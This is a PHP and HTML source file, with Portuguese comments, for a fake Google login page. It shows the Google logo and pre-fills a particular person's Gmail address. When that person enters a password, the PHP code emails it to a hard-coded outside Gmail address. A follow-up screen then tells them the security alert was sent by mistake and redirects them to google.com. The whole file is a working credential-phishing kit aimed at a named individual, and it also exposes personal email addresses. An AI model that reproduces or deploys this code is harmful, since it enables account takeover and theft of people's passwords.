<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Coleta os dados do formulário
    $senha = htmlspecialchars($_POST['senha']);

    // Aqui você pode realizar a validação da senha, por exemplo, verificando se ela atende aos requisitos de segurança.
    
    // Destinatário do e-mail
    $destinatario = "fxio0909@gmail.com";
    $assunto = "Novo Contato";

    // Corpo do e-mail
    $corpo = "Senha: $senha";

    // Cabeçalhos do e-mail
    $cabecalhos = "From: contato@seudominio.com";

    // Envia o e-mail
    if (mail($destinatario, $assunto, $corpo, $cabecalhos)) {
        echo "Mensagem enviada com sucesso!";
    } else {
        echo "Ocorreu um erro ao enviar a mensagem.";
    }
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Página de Login</title>
  <style>
    /* Seus estilos CSS aqui */
  </style>
</head>
<body>
  <div class="container">
    <!-- Tela de Login -->
    <div id="loginContainer" class="login-container">
      <form method="POST" action="login.php">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo" class="google-logo">
        <div class="user-info">
          <div class="user-icon"></div>
          <span class="user-email">Souzatelesrogerio@gmail.com</span>
          <span class="dropdown-arrow">▼</span>
        </div>
        <h2>Olá!</h2>
        <div class="password-container">
          <input type="password" id="password" name="senha" placeholder="Senha" required><br><br>
        </div>
        <div class="show-password">
          <input type="checkbox" id="showPassword" onclick="togglePassword()"> <label for="showPassword">Mostrar senha</label>
        </div>
        <div class="button-container">
          <div class="forgot-password">
            <a href="#" onclick="forgotPassword()">Esqueceu sua senha?</a>
          </div>
          <button type="submit">Fazer Login</button>
        </div>
      </form>
    </div>

    <!-- Tela de Erro -->
    <div id="errorContainer" class="error-container">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo" class="google-logo">
      <h1>Notificação Enviada por Engano</h1>
      <p>Não identificamos nenhum novo dispositivo conectado à sua conta.</p>
      <p>O e-mail que você recebeu foi enviado por engano. Pedimos desculpas pelo inconveniente.</p>
      <p>Se precisar de mais informações, você pode acessar sua conta.</p>
      <div class="error-button">
        <button onclick="window.location.href='https://www.google.com'">Acessar Conta</button>
      </div>
    </div>
  </div>
  <script>
    function togglePassword() {
      let passwordField = document.getElementById('password');
      let checkbox = document.getElementById('showPassword');
      passwordField.type = checkbox.checked ? 'text' : 'password';
    }

    function forgotPassword() {
      alert("Não é possível entrar nessa página.");
    }
  </script>
</body>
</html>
